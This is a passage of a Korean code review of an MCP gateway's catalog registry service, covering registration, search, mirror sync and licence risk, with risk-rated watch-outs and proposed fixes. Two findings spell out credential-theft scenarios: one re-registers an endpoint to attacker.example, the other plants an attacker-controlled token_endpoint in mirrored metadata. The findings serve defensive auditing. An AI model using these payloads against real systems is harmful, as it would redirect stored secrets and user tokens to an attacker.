                 data={"item_id": item.id, "note": note})
    return item
```
**분석 / Analysis (Level 2)**
- L238-246 `reject`: 대상 버전(기본 최신 pending)을 `rejected` 로. item 이 `pending`(첫 버전 거부)일 때만 item 도 `rejected`. 기존 승인 버전이 있는 항목의 대기 버전 거부는 item 을 그대로 둔다(시험 `test/test_catalog.py:84-88`).
**짚어볼 점 / Watch-outs**
- [위험:낮음] L240-242: **현재 승인 버전**을 명시해 거부해도 item 은 `approved`/`active` 이고 `item.version`·메타데이터도 그 버전 그대로 — 거부된 버전이 계속 발견 노출(`DISCOVERABLE`)된다. 운영자는 "거부 = 내림" 으로 기대하기 쉽다. 최소 수정: 거부 대상이 `item.version` 이면 직전 승인 버전으로 되돌리거나 item 을 `deprecated` 로.

```python path=app/services/registry.py lines=249-272
# ── 등록(즉시 사용) — 타입별 인스턴스 생성 핸들러 (각 Epic 이 등록) ──
RegisterHandler = Callable[[Session, CatalogItem, str, dict], dict]
REGISTER_HANDLERS: dict[str, RegisterHandler] = {}


def register_handler(type_: str):
    def deco(fn: RegisterHandler) -> RegisterHandler:
        REGISTER_HANDLERS[type_] = fn
        return fn
    return deco


def register(db: Session, item: CatalogItem, actor: str, options: dict | None = None) -> dict:
    if item.status not in ("approved", "active"):
        raise bad_request(f"승인된 항목만 등록할 수 있습니다 (현재 {item.status}).", code="not_approved")
    handler = REGISTER_HANDLERS.get(item.type)
    if handler is None:
        raise bad_request(f"{item.type} 등록 핸들러가 없습니다.", code="no_handler")
    instance = handler(db, item, actor, options or {})
    item.status = "active"
    item.ref_id = instance["id"]
    db.commit()
    audit.append("catalog.register", actor=actor, target=f"{item.type}:{item.name}", data={"instance": instance["id"]})
    return instance
```
**분석 / Analysis (Level 2)**
- L250-258: 데코레이터 등록 패턴. 핸들러는 정의 모듈이 import 될 때 전역 dict 에 들어간다 — 이 파일의 mcp_server(L279), `app/api/a2a.py:718`(a2a_agent), `app/api/llm.py:271`(model). agent_profile 핸들러는 없다(등록 시 400 `no_handler`). 라우터 모듈 import 가 곧 기능 등록이라는 결합은 1차 INDEX §4.2(`.review/CODE-REVIEW-Lv2/INDEX.md:225`)가 지적한 그대로다 — 나중에 구성요소별 지연 import 로 바꾸면 핸들러가 조용히 사라진다.
- L261-272 `register`: 승인/활성 항목만 → 유형 핸들러 → item `active`·`ref_id` → 커밋 → 감사. `options` 는 API 본문 dict 가 형식 검사 없이 그대로 넘어온다(`app/api/catalog.py:296-303`).
- L271: 감사에는 인스턴스 id 만 남는다 — 어떤 endpoint·auth 로 등록했는지는 남지 않는다(아래 L290).

```python path=app/services/registry.py lines=275-296
def namespace_of(name: str) -> str:
    return slugify(name.split("/")[-1])


@register_handler("mcp_server")
def _register_mcp(db: Session, item: CatalogItem, actor: str, options: dict) -> dict:
    """기본 MCP 인스턴스 생성 — 도구 조회·헬스·기본 정책은 mcp 서비스가 확장한다."""
    from app.models import McpServer
    meta = item.item_metadata or {}
    ns = options.get("namespace") or namespace_of(item.name)
    if not re.fullmatch(r"[a-z0-9][a-z0-9-]{0,62}", ns):
        raise bad_request("namespace 형식 오류 (소문자·숫자·하이픈)")
    srv = db.get(McpServer, ns)
    remotes = meta.get("remotes") or []
    packages = meta.get("packages") or []
    endpoint = options.get("endpoint") or (remotes[0]["url"] if remotes else None)
    transport = "streamable-http" if endpoint else "stdio"
    command: list[str] = []
    if not endpoint and packages:
        pkg = packages[0]
        hint = pkg.get("runtimeHint") or {"npm": "npx", "pypi": "uvx", "oci": "docker"}.get(pkg["registryType"], "")
        command = [hint, pkg["identifier"]] if hint != "docker" else ["docker", "run", "-i", "--rm", pkg["identifier"]]
```
**분석 / Analysis (Level 2)**
- L275-276 `namespace_of`: `io.github.acme/weather` → `weather`. 마지막 경로 조각의 slug(`app/core/ids.py:13-15`, 비면 `item`).
- L282: `McpServer` 를 함수 안에서 import(상단 목록에 없음 — 순환 때문은 아니고 스타일).
- L284-286: 인스턴스 id = namespace. 정규식은 `McpServer.id` 길이 64(`app/models.py:271`)와 맞춘 63자 이하 소문자·숫자·하이픈.
- L288-291: endpoint = 옵션 → 없으면 첫 remote URL. endpoint 가 있으면 streamable-http, 없으면 stdio.
- L293-296: 패키지 실행 명령. `runtimeHint`(게시자 입력) 또는 레지스트리 종류별 기본(npm→npx, pypi→uvx, oci→docker run).
**짚어볼 점 / Watch-outs**
- [위험:중간] L284·L290(+L311-312): 등록 옵션의 `endpoint`·`namespace` 를 검증 없이 쓴다. 승인된 server.json 의 `remotes` 와 다른 주소로 등록할 수 있고, 기존 인스턴스 재등록 때는 `auth or srv.auth`(L311-312) 때문에 저장된 자격 증명(운영자가 `gateway:write` 로 넣은 `secret_ref`)은 그대로 둔 채 endpoint 만 바뀐다. 이 경로는 D19-④ 의 전송처 통제 `secrets.check_destination`(`app/services/secrets.py:40-51`, "전송처 변경은 `gateway:write`")을 거치지 않는다 — 호출부 `app/api/catalog.py:295-303` 은 `catalog:write` 만 요구한다. 시나리오: 운영자가 카탈로그 자동화용으로 `catalog:write` 스코프 PAT 를 발급(스코프 = 권한 이름, `app/core/auth.py:36-40`) → 유출 → `POST /v1/catalog/{활성 항목}/register {"endpoint": "https://attacker.example/mcp"}` → 다음 도구 호출부터 게이트웨이가 저장 시크릿을 `Authorization: Bearer` 로 attacker 에 보낸다(`app/services/mcp_gateway.py:125-138`). 감사에는 인스턴스 id 만(L271). 역할 기준으로는 operator 가 이미 `gateway:write` 를 가져 권한 상승은 아니지만, 승인된 주소와 다른 등록·전송처 통제 우회·감사 공백이 남는다. 최소 수정: register 에 principal 을 넘겨 `endpoint` 옵션이 승인된 remote 와 다르면 `gateway:write` 요구 + `secrets.destination_changed`·`check_destination` 적용, 감사에 endpoint 기록.
- [위험:낮음] L291: `remotes[0].type == "sse"` 도 streamable-http 로 기록한다. 게이트웨이 전송은 streamable-http·hosted-openapi·stdio 뿐(`app/services/mcp_gateway.py:5`)이라 구식 SSE 전송만 지원하는 서버는 연결에 실패한다(가능성 — 업스트림이 두 방식을 모두 받으면 동작). 최소 수정: sse 는 등록 거부 또는 경고.
- [위험:낮음] L284-286: 이름은 200자까지(L40-41)인데 slug 가 63자를 넘으면 기본 namespace 로는 "namespace 형식 오류" — 옵션을 줘야 한다는 안내가 없다. 최소 수정: 기본값을 `slug[:63].rstrip("-")`.
- [위험:낮음] L295-296: 게시자 입력 `runtimeHint` 가 실행 파일 이름이 된다. stdio 실행은 허용 목록이 막고(`app/services/mcp_gateway.py:534-543`, 기본 빈 값 `app/core/config.py:73`) 그 docstring 이 "인터프리터를 실행 파일만으로 허용하면 인자로 임의 코드" 라고 경고한다 — 운영자가 `npx` 를 단독 항목으로 허용하면 게시자가 고른 패키지(identifier)가 게이트웨이 컨테이너에서 실행된다. nuget·mcpb 는 hint 가 `""` 라 `["", id]` 무효 명령.

```python path=app/services/registry.py lines=297-316
    auth = dict((meta.get("_meta") or {}).get("auth") or {})
    own = f"mcp/{ns}/"  # 게시 메타데이터는 플랫폼 시크릿을 묶을 수 없다 — 시크릿 연결은 운영자가 설정 화면(gateway:write)에서
    if not str(auth.get("secret_ref") or own).startswith(own):
        auth.pop("secret_ref")
    if isinstance(auth.get("tls"), dict):
        auth["tls"] = {k: v for k, v in auth["tls"].items()
                       if k not in ("ca_secret", "client_cert_secret") or str(v).startswith(own)}
    if srv is None:
        srv = McpServer(id=ns, catalog_item_id=item.id, name=meta.get("title") or item.name, transport=transport,
                        endpoint=endpoint, command=command, server_json=meta, auth=auth, owner=actor)
        db.add(srv)
    elif srv.catalog_item_id not in (None, item.id):
        raise conflict(f"namespace '{ns}' 는 다른 서버가 사용 중입니다.")
    else:
        srv.catalog_item_id, srv.server_json, srv.endpoint, srv.transport, srv.auth = item.id, meta, endpoint, \
            transport, auth or srv.auth
        srv.status = "active"
    db.flush()
    return {"id": srv.id, "type": "mcp_server", "endpoint": endpoint, "transport": transport,
            "gateway_path": f"/mcp/{srv.id}"}
```
**분석 / Analysis (Level 2)**
- L297: 게시 메타데이터의 `_meta.auth` 를 복사(`dict(...)` — 원본 JSON 을 바꾸지 않게 얕은 복사).
- L298-300: Epic 39 — 자기 네임스페이스(`mcp/{ns}/`) 밖의 `secret_ref` 는 제거. 접두 끝의 `/` 덕분에 `jira` 와 `jira2` 가 서로의 시크릿을 가리키지 못한다. `secret_ref` 가 비었으면 `own` 으로 대체돼 통과(제거할 것이 없음). 같은 규칙의 API 쪽 구현은 `secrets.foreign_refs`(`app/services/secrets.py:17-21`) — 여기는 403 대신 조용히 제거한다(게시자는 운영자가 아니므로 막지 않고 떨어뜨리는 설계).
- L301-303: `tls` 의 시크릿 키(`ca_secret`·`client_cert_secret`)도 같은 규칙. 비시크릿 값(`verify` 등)은 유지 — 시험 `test/test_review_fixes.py:271-282`.
- L304-307: 새 인스턴스. `owner=actor`(등록자).
- L308-309: 다른 카탈로그 항목이 쓰는 namespace 면 409.
- L310-313: 같은 항목(또는 `catalog_item_id` 가 없는 행) 재등록 — 메타데이터·endpoint·transport 를 덮고, auth 는 게시 값이 비었으면 기존 값 유지.
- L314-316: `flush` 만 하고 커밋은 `register`(L270)가 한다 — 핸들러가 실패하면 함께 롤백.
**짚어볼 점 / Watch-outs**
- [위험:중간] L297: 시크릿 참조만 거르고 **전송처 키**(`authorization_server`·`token_endpoint`·`resource_metadata`·`mode`)는 게시 값 그대로 인스턴스 auth 가 된다 — `secrets.DESTINATION_KEYS`(`app/services/secrets.py:31`)가 "자격 증명이 가는 곳" 으로 정의한 바로 그 키들. 외부 인가 서버이고 mode 가 service 가 아니면 게이트웨이는 사용자 플랫폼 토큰을 그 token_endpoint 로 보낸다(`app/services/mcp_gateway.py:144-176`, `subject_token=p.raw_token`). VERIFY 는 "서버 등록은 카탈로그 승인을 거친다" 를 근거로 기존 결정(`.review/round2/VERIFY.md:53`)으로 두었으나, (a) 미러 `auto_approve`(L199-200, `app/models.py:254`)는 사람 승인 없이 approved 가 되고, (b) 승인 점검·diff 는 `_meta.auth` 를 보여 주지 않는다(점검 = 스키마·서명·SBOM·출처 `app/services/review.py:69-98`, diff = tools·scopes·remotes·url·license·version `:106-124`). 시나리오: auto_approve 를 켠 custom·file 미러에 `_meta.auth: {"type":"oauth2","authorization_server":"https://as.attacker.example","token_endpoint":"https://as.attacker.example/token"}` 항목 → 자동 승인 → 운영자 "즉시 사용" → 이 서버 도구를 부르는 모든 사용자의 플랫폼 토큰이 외부로. 최소 수정: 등록 때 외부 `authorization_server` 는 운영자 허용 목록(또는 `gateway:write` 확인)만, auto_approve 항목은 auth 에 전송처 키가 있으면 `pending` 유지, 승인 점검·diff 에 auth 전송처 표시.
- [위험:낮음] L306·L311: `server_json` 은 게시 메타데이터 전체를 거르지 않고 저장한다. 게이트웨이는 hosted-openapi 전송일 때 `server_json._meta.hosted.secret_ref` 를 읽는다(`app/services/mcp_gateway.py:567-580`). 등록은 transport 를 streamable-http/stdio 로 덮어(L291, L311) 지금은 이 경로가 닫혀 있지만, Epic 39 의 "게시 메타데이터의 남의 참조 제거" 불변식이 `_meta.hosted` 에는 없다. 최소 수정: `_meta.hosted.secret_ref` 에도 같은 `own` 검사.
- [위험:낮음] L311-312: 재등록은 transport 를 다시 계산해 덮는다 — OpenAPI 로 만든 hosted-openapi 서버(`app/api/mcp.py:650-654` `_mark`)의 카탈로그 항목에 `POST /v1/catalog/{id}/register` 하면 transport 가 stdio(`agentnexus/hosted-openapi` oci → docker 명령, L296)로 바뀌어 서버가 멈춘다(허용 목록 밖). 또 `command` 는 새 인스턴스(L305-306)에만 저장되고 재등록 때는 갱신되지 않는다. 최소 수정: hosted-openapi 인스턴스는 transport 유지, 재등록 때 command 도 갱신.

```python path=app/services/registry.py lines=319-351
# ── 발견 API 표현 (/v0/servers) ──
def server_entry(item: CatalogItem) -> dict:
    return {"server": item.item_metadata,
            "_meta": {"io.modelcontextprotocol.registry/official": {
                "status": "deprecated" if item.status == "deprecated" else "active",
                "publishedAt": item.created_at.isoformat(), "updatedAt": item.updated_at.isoformat(),
                "isLatest": True},
                "io.agentnexus/catalog": {"id": item.id, "status": item.status, "source": item.source,
                                          "signatureVerified": item.signature_verified, "instance": item.ref_id}}}


DISCOVERABLE = ("approved", "active")


def searchable_text(item: CatalogItem) -> str:
    meta = item.item_metadata or {}
    parts = [item.name, item.display_name or "", item.description or "", " ".join(item.tags or []),
             item.auth_scheme or "", item.license or ""]
    if item.type == "mcp_server":
        m = meta.get("_meta") or {}
        parts += [str(t) for t in (m.get("tools") or [])]
        parts += [r.get("type", "") for r in meta.get("remotes") or []]
    if item.type in ("a2a_agent", "agent_profile"):
        card = meta.get("card", meta)  # Agent Card 는 스킬·보안 스킴까지 색인 (FR-C03)
        for s in card.get("skills") or []:
            parts += [s.get("id", ""), s.get("name", ""), s.get("description", ""), " ".join(s.get("tags") or [])]
        parts += list((card.get("securitySchemes") or {}).keys())
        parts += [str((v or {}).get("type", "")) for v in (card.get("securitySchemes") or {}).values()]
    return " ".join(parts).lower()


def trust_of(item: CatalogItem) -> str | None:
    return ((item.item_metadata or {}).get("_anx_review") or {}).get("trust")
```
**분석 / Analysis (Level 2)**
- L320-327 `server_entry`: 공식 MCP Registry 응답 모양(`server` + `_meta["io.modelcontextprotocol.registry/official"]`)에 AgentNexus 카탈로그 메타를 더한다. `isLatest` 는 항상 True(이 카탈로그는 항목당 현재 버전 하나만 노출).
- L330 `DISCOVERABLE`: 일반 사용자·익명에게 보이는 상태.
- L333-347 `searchable_text`: 이름·표시 이름·설명·태그·인증 방식·라이선스 + (MCP) 도구·remote 종류 + (A2A·프로파일) 카드 스킬·보안 스킴을 소문자 한 문자열로. agent_profile 은 카드를 `card` 아래에 둔다(`app/api/agents.py:586`) — `meta.get("card", meta)` 가 두 모양을 모두 받는 이유.
- L350-351 `trust_of`: `_anx_review.trust`. 승인 API 가 쓰는 값은 `official|partner|community|external`(`app/api/catalog.py:173`)인데 게이트웨이 기본 규칙은 `== "trusted"` 를 비교한다(`app/services/governance.py:60`) — 정상 승인으로는 `trusted` 가 될 수 없어 그 분기는 사실상 죽은 코드다(안전 쪽 실패). 그 값에 닿는 유일한 경로가 L134 주입이다.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L321: 발견 응답에 `item.item_metadata` 전체를 넣는다 — `_anx_review`(승인자 sub·도구 위험도)·`_anx_instant`(사용자 sub·policy_id, `app/api/catalog.py:439-440`) 같은 내부 기록이 인증 없는 `GET /v0/servers`·`/v0/servers/{id}`(`app/api/catalog.py:491-508`, `optional_principal`; 무헤더 호출 시험 `test/test_catalog.py:50`)로 나간다. 최소 수정: `_anx_` 접두 키를 빼고 반환.
- [위험:낮음] L342-346: 카드 형식을 가정한다(`skills` 항목이 dict, `tags` 가 문자열 목록). a2a_agent 게시는 검증이 없어(L158) `skills: ["x"]` 인 대기 항목 하나가 승인자(상태 필터 없음, `app/api/catalog.py:44-45`)의 자유어 검색마다 AttributeError 500 을 낸다(같은 가정 L358). 최소 수정: 색인 때 `isinstance` 방어 또는 게시 때 `a2a_proto.validate_card`.

```python path=app/services/registry.py lines=354-377
def match_hint(item: CatalogItem, terms: list[str]) -> str | None:
    """이름 밖에서 일치한 도구·스킬 (E01 ⑤ 'jira-link ← jira 일치')."""
    meta = item.item_metadata or {}
    cands = [str(t) for t in ((meta.get("_meta") or {}).get("tools") or [])]
    cands += [s.get("id", "") for s in (meta.get("card", meta).get("skills") or [])]
    for t in terms:
        if t in (item.name + " " + (item.display_name or "")).lower():
            continue
        for c in cands:
            if t in c.lower():
                return f"{c} ← '{t}' 일치"
    return None


def parse_query(q: str | None) -> tuple[list[str], dict[str, str]]:
    """'jira tag:이슈 auth:oauth2' → (자유어, {tag, auth, trust, type, status})."""
    free, keys = [], {}
    for tok in (q or "").split():
        k, sep, v = tok.partition(":")
        if sep and k.lower() in ("tag", "auth", "trust", "type", "status") and v:
            keys[k.lower()] = v
        else:
            free.append(tok.lower())
    return free, keys
```
**분석 / Analysis (Level 2)**
- L354-365 `match_hint`: 이름 밖(도구·스킬 id)에서 일치한 근거를 "jira-link ← 'jira' 일치" 로 돌려준다. 이름에 이미 있는 용어는 건너뛴다.
- L368-377 `parse_query`: `tag:`·`auth:`·`trust:`·`type:`·`status:` 만 키로 인식, 나머지는 소문자 자유어. `auth:` 처럼 값이 비면 자유어 `"auth:"` 로 남는다. 키 값은 소문자로 바꾸지 않는다(태그는 대소문자 구분).

```python path=app/services/registry.py lines=380-411
def search(db: Session, *, q: str | None = None, type_: str | None = None, statuses: tuple[str, ...] | None = None,
           tag: str | None = None, source: str | None = None, auth: str | None = None, trust: str | None = None,
           limit: int = 50, offset: int = 0) -> tuple[list, int]:
    terms, keys = parse_query(q)
    type_, tag = type_ or keys.get("type"), tag or keys.get("tag")
    auth, trust = auth or keys.get("auth"), trust or keys.get("trust")
    if keys.get("status"):
        statuses = tuple(x for x in keys["status"].split(",") if statuses is None or x in statuses) or ("-",)
    stmt = select(CatalogItem).order_by(CatalogItem.type, CatalogItem.name)
    if type_:
        stmt = stmt.where(CatalogItem.type == type_)
    if statuses:
        stmt = stmt.where(CatalogItem.status.in_(statuses))
    if source:
        stmt = stmt.where(CatalogItem.source == source)
    items = list(db.scalars(stmt))
    if tag:
        items = [i for i in items if tag in (i.tags or [])]
    if auth:
        wanted = set(auth.split(","))
        items = [i for i in items if (i.auth_scheme or "none") in wanted]
    if trust:
        wanted = set(trust.split(","))
        items = [i for i in items if (trust_of(i) or "-") in wanted]
    if terms:
        items = [i for i in items if all(t in searchable_text(i) for t in terms)]

        def score(i: CatalogItem) -> int:  # 점수순 — 이름 > 태그 > 도구·스킬·설명
            name, tags = (i.name + " " + (i.display_name or "")).lower(), " ".join(i.tags or []).lower()
            return sum(3 if t in name else 2 if t in tags else 1 for t in terms)
        items.sort(key=lambda i: -score(i))
    return items[offset:offset + limit], len(items)
```
**분석 / Analysis (Level 2)**
- L383-385: 명시 인자가 질의 키보다 우선.
- L386-387: `status:` 키는 호출부가 허락한 상태와 **교집합**만, 비면 `("-",)` 센티널로 0건 — 일반 사용자가 `q=status:pending` 으로 대기 항목을 볼 수 없다(좋은 방어).
- L388-395: DB 조건은 유형·상태·출처뿐, 나머지 필터(태그·인증·신뢰·자유어)는 Python. 자유어는 AND, 점수(이름 3·태그 2·그 밖 1) 내림차순 — `sort` 는 안정 정렬이라 동점이면 유형·이름 순 유지.
**짚어볼 점 / Watch-outs**
- [위험:중간] L395-411: 조건에 맞는 행을 **전부** 메모리로 읽고(JSON 메타데이터 포함) 거른 뒤 잘라 낸다. `GET /v0/servers` 는 인증 없이(`optional_principal`) `limit=10_000` 으로 부르고 페이지를 메모리에서 자르며(`app/api/catalog.py:495-498`), `/v1/catalog` 는 요청마다 `search` 를 5번 부른다(`:59-64`). 미러 auto_approve 로 공식 레지스트리를 받으면 동기화 1회에 최대 5,000건(L436 50페이지 × 100)이 DISCOVERABLE 이 되어 익명 요청 하나가 수천 행·JSON 을 읽는다 — 비인증 부하 증폭(가능성, 규모 의존). 자유어 필터는 항목마다 `searchable_text` 를 용어 수만큼 다시 만든다(L405). 최소 수정: DB 페이지네이션(limit/offset 또는 keyset)과 이름·태그의 SQL 조건, 검색 텍스트 사전 계산 컬럼, `/v0/servers` 요청 한도.
- [위험:낮음] L411: 음수 `offset`·`limit` 를 막지 않는다. 호출부 `limit: int = Query(50, le=500)`·`offset: int = 0` 은 하한이 없어(`app/api/catalog.py:54`) `limit=-1` 이면 `items[0:-1]` — 상한 500 을 넘는 거의 전체 목록. 최소 수정: 호출부 `ge=1`/`ge=0`.

```python path=app/services/registry.py lines=414-446
# ── 미러 동기화 (SCR-E06) ──
def parse_docker_catalog(text: str) -> list[dict]:
    """Docker MCP 카탈로그(YAML: registry: {name: {...}}) → server.json 목록."""
    doc = yaml.safe_load(text) or {}
    out = []
    for key, entry in (doc.get("registry") or {}).items():
        if not isinstance(entry, dict) or not entry.get("image"):
            continue
        image = entry["image"]
        out.append({"name": f"io.docker.mcp/{slugify(key)}",
                    "title": entry.get("title") or key,
                    "description": (entry.get("description") or key)[:100],
                    "version": str(entry.get("version") or (image.split(":")[1] if ":" in image else "latest")),
                    "packages": [{"registryType": "oci", "identifier": image, "transport": {"type": "stdio"}}],
                    "_meta": {"tools": [t.get("name") for t in entry.get("tools") or [] if isinstance(t, dict)],
                              "license": entry.get("license"), "source": "docker-mcp-catalog"}})
    return out


def _fetch_official(base: str) -> list[dict]:
    out, cursor = [], None
    with sync_client(timeout=30) as http:
        for _ in range(50):  # 페이지 상한
            params = {"limit": 100, **({"cursor": cursor} if cursor else {})}
            res = http.get(base.rstrip("/") + "/v0/servers", params=params)
            res.raise_for_status()
            body = res.json()
            for entry in body.get("servers", []):
                out.append(entry.get("server", entry))
            cursor = (body.get("metadata") or {}).get("nextCursor") or (body.get("metadata") or {}).get("next_cursor")
            if not cursor:
                break
    return out
```
**분석 / Analysis (Level 2)**
- L415-430 `parse_docker_catalog`: `registry: {key: {image, title, description, version, tools, license}}` → server.json(oci 패키지·stdio). 이미지 없는 항목은 건너뛰고, 설명은 100자로 자른다(스키마 상한). `title` 은 자르지 않아 100자를 넘으면 L159 에서 invalid 로 집계된다.
- L433-446 `_fetch_official`: `/v0/servers` 를 커서로 최대 50페이지 × 100. `nextCursor`·`next_cursor` 두 철자를 모두 받는다. 페이지 상한 덕에 같은 커서를 되돌려 주는 서버에도 무한 루프가 없다.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L426: 이미지 참조의 첫 `:` 를 태그 구분자로 가정한다 — `registry.local:5000/mcp/x` 는 version 이 `5000/mcp/x`, `img@sha256:…` 는 해시 조각이 된다. 최소 수정: 마지막 `/` 뒤에서 `rpartition(":")`, digest(`@`)는 따로.
- [위험:낮음] L438-442: 응답 크기 상한이 없고(`res.json()` 전체 메모리), 상위 항목의 레지스트리 메타(`_meta[...official].status`·`isLatest`)를 버리고 `server` 만 가져온다 — 상위에서 deprecated·deleted 로 표시한 항목도 가져와 auto_approve 면 노출될 수 있다(가능성 — 상위 기본 목록이 그런 항목을 포함하는지는 확인 필요). 이 파일의 발견 응답(L322-325)은 같은 status 를 내보내면서 가져올 때는 보지 않는 비대칭. 최소 수정: 상위 status 가 active 가 아니면 건너뛰기, 응답 크기 상한.
- [위험:낮음] L435-438: 소스 URL 은 `catalog:write`(운영자) 입력이고 egress 가드는 링크 로컬·IMDS 만(`app/core/http.py:34-38`) — 내부 서비스로 GET 가능(블라인드에 가깝고 오류 문구가 `last_status` 에 남는다, L508). 운영자 권한이라 낮음.

```python path=app/services/registry.py lines=449-476
def import_entries(db: Session, source: RegistrySource, entries: list[dict], actor: str) -> dict:
    counts = {"imported": 0, "unchanged": 0, "invalid": 0, "filtered": 0, "errors": []}
    pats = [n.strip() for n in (source.namespaces or []) if n.strip()]
    for doc in entries:
        ns = str(doc.get("name", "")).split("/")[0]
        if pats and not any(fnmatch.fnmatchcase(ns, x) or fnmatch.fnmatchcase(str(doc.get("name", "")), x) for x in pats):
            counts["filtered"] += 1  # 허용 네임스페이스 밖 (E06 ②)
            continue
        try:
            _, _, created_ver = publish(db, "mcp_server", doc.get("name", ""), str(doc.get("version", "")), doc, actor,
                                        source="mirror", source_id=source.id, auto_approve=source.auto_approve,
                                        require_signature=source.require_signature)
            counts["imported" if created_ver else "unchanged"] += 1
        except ApiError as exc:
            db.rollback()
            counts["invalid"] += 1
            if len(counts["errors"]) < 20:
                counts["errors"].append({"name": doc.get("name"), "error": exc.code, "detail": exc.extra or exc.detail})
    source.last_sync_at = utcnow()
    source.item_count = counts["imported"] + counts["unchanged"]
    source.last_status = (f"{'partial' if counts['invalid'] and source.item_count else 'error' if counts['invalid'] else 'ok'}: "
                          f"imported={counts['imported']} unchanged={counts['unchanged']} invalid={counts['invalid']} "
                          f"filtered={counts['filtered']}")
    source.last_result = {**{k: v for k, v in counts.items()}, "at": utcnow().isoformat(), "total": len(entries)}
    db.commit()
    audit.append("registry.sync", actor=actor, target=source.name, data={k: v for k, v in counts.items()
                                                                          if k != "errors"})
    return counts
```
**분석 / Analysis (Level 2)**
- L450-456: 허용 네임스페이스 glob 은 접두(`io.github.acme`) 또는 전체 이름에 대해 `fnmatchcase`(대소문자 구분) — 하나도 맞지 않으면 `filtered`.
- L457-466: 항목마다 `publish`(출처 mirror·소스의 자동 승인·서명 필수). `publish` 가 항목별로 커밋하므로(L196) 한 항목의 실패가 앞선 항목을 되돌리지 않는다 — 부분 성공 설계. 오류 목록은 20건까지.
- L467-473: 소스 상태 문자열(ok/partial/error)과 결과 요약을 남기고 커밋, 감사에는 오류 목록을 뺀 건수만.
**짚어볼 점 / Watch-outs**
- [위험:중간] L457-466: `except ApiError` 만 잡는다 — 게시 경로의 비 ApiError 가 루프 밖으로 나간다. (1) 서명 블록이 dict 가 아니거나 필드가 빠지거나 PEM 이 깨진 경우(L102-109), (2) PostgreSQL 에서 `version` 41~255자(스키마 L44 는 허용, 컬럼 `String(40)`) 또는 `_meta.license` 80자·`_meta.auth.type` 40자 초과(L141·L143) → L196 커밋 때 DataError(SQLite 는 길이를 강제하지 않아 local·시험에서 안 보인다). 결과: 앞 항목은 이미 커밋됐고 `last_sync_at`(L467)은 갱신되지 않으며 API 는 500. 예약 동기화는 `registry_jobs` 가 `ApiError` 만 잡아(`app/services/scheduler.py:70-76`) 예외가 `tick` 밖으로 나가고, `tick` 은 registry 다음 단계인 **보존 작업**(`:125-129`)을 건너뛴다(바깥 루프가 경고만 남김 `:138-141`). `last_sync_at` 이 그대로라 다음 주기에도 `due_sources` 가 같은 소스를 골라 같은 항목에서 멈춘다 → 그 항목이 상위 피드에 남아 있는 동안 미러 뒤쪽 항목은 들어오지 않고 **예약 보존(FR-O02 텔레메트리 삭제)도 계속 돌지 않는다**. 누가: 미러 상위(custom URL 운영 주체·에어갭 번들 작성자, 공식 레지스트리 게시자는 상위 스키마가 허용하는 범위에서). 최소 수정: 루프에서 항목 단위 `except Exception` → `db.rollback()`·invalid 집계(코드 `internal`), `verify_signature` 형식 검사(L102-109), 스키마 `version.maxLength` 를 40 으로·license 길이 절단, `registry_jobs` 도 소스 단위로 모든 예외를 격리.
- [위험:낮음] L458-460(+L202-204): 자동 승인이 아닌 미러의 첫 동기화는 항목마다 `notify` 1건·`audit.append` 1건 — 수천 건 알림, 그리고 감사 체인 머리 직렬화(`app/services/audit.py:56` `_lock`·머리 잠금) 때문에 동기화가 길어지는 동안 다른 감사 쓰기가 줄을 선다. 최소 수정: 동기화 요약 알림 1건, 감사는 요약 + 항목 id 목록.

```python path=app/services/registry.py lines=479-513
def due_sources(db: Session) -> list[RegistrySource]:
    """예약 동기화 대상 (E06 ③) — 주기가 있고 마지막 동기화 후 주기가 지난 원격 소스."""
    now = utcnow()
    return [s for s in db.scalars(select(RegistrySource).where(RegistrySource.enabled.is_(True),
                                                                RegistrySource.sync_interval_s.is_not(None),
                                                                RegistrySource.kind != "file"))
            if s.last_sync_at is None or (now - s.last_sync_at).total_seconds() >= s.sync_interval_s]


def sync_source(db: Session, source: RegistrySource, actor: str) -> dict:
    if not source.enabled:
        raise bad_request("비활성 소스입니다.")
    from app.services import deploy
    if source.kind in ("official", "docker") and deploy.airgap(db):
        raise bad_request("에어갭 모드 — 외부 레지스트리 동기화를 할 수 없습니다. 번들(nexus bundle import)·file 소스를 쓰세요 (ST-09).",
                          code="airgap")
    try:
        if source.kind in ("official", "custom"):
            entries = _fetch_official(source.url or "")
        elif source.kind == "docker":
            with sync_client(timeout=30) as http:
                res = http.get(source.url or "")
                res.raise_for_status()
                entries = parse_docker_catalog(res.text)
        else:
            raise bad_request("file 소스는 /import 로 가져옵니다.")
    except ApiError:
        raise
    except Exception as exc:  # noqa: BLE001 — 원격 오류를 상태로 기록
        source.last_status = f"error: {type(exc).__name__}: {exc}"[:500]
        source.last_result = {"error": source.last_status, "at": utcnow().isoformat()}
        source.last_sync_at = utcnow()
        db.commit()
        raise ApiError(502, "sync_failed", source.last_status) from exc
    return import_entries(db, source, entries, actor)
```
**분석 / Analysis (Level 2)**
- L479-485 `due_sources`: 켜져 있고 주기가 있고 file 이 아닌 소스 중 주기가 지난 것. 경과 계산은 tz-aware UTC 끼리(`UTCDateTime`).
- L488-494: 비활성 소스 400, 에어갭이면 official·docker 거부(ST-09). `deploy.airgap` 은 5초 캐시(`app/services/deploy.py:41-45`).
- L495-504: 종류별 가져오기. file 은 `/import` 로만.
- L505-512: `ApiError` 는 그대로, 그 밖(연결 오류·HTTP 오류·JSON 파싱 오류)은 소스 상태에 기록·커밋 후 502. 오류 문구에 예외 문자열(내부 URL 포함 가능)이 들어가지만 소스 화면(`catalog:read`)에만 보인다.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L492: 에어갭이 `custom` 을 막지 않는다. 사내 미러를 가정한 설계로 보이지만(메시지는 "외부 레지스트리 동기화 불가") custom URL 이 인터넷 주소여도 그대로 나간다. 최소 수정: 에어갭이면 custom 도 사설·허용 호스트만, 아니면 의도를 문서화.
- [위험:낮음] L513: `import_entries` 는 `try` 밖이라 L457-466 의 비 ApiError 는 상태 기록 없이 나간다(같은 결함의 두 번째 지점 — 별도 집계하지 않음).

```python path=app/services/registry.py lines=516-542
# ── SBOM·라이선스 (FR-P04, SCR-E08) ──
_LOW = ("mit", "apache", "bsd", "isc", "psf", "python software foundation", "unlicense", "0bsd", "zlib", "cc0",
        "postgresql")
_MED = ("mpl", "lgpl", "epl", "elastic", "elv2", "cddl", "enterprise", "ee/", "commercial")
_HIGH = ("agpl", "gpl", "sspl", "rsal", "busl", "business source")


def license_risk(lic: str | None) -> str:
    v = (lic or "").lower()
    if not v or v in ("unknown", "noassertion"):
        return "unknown"
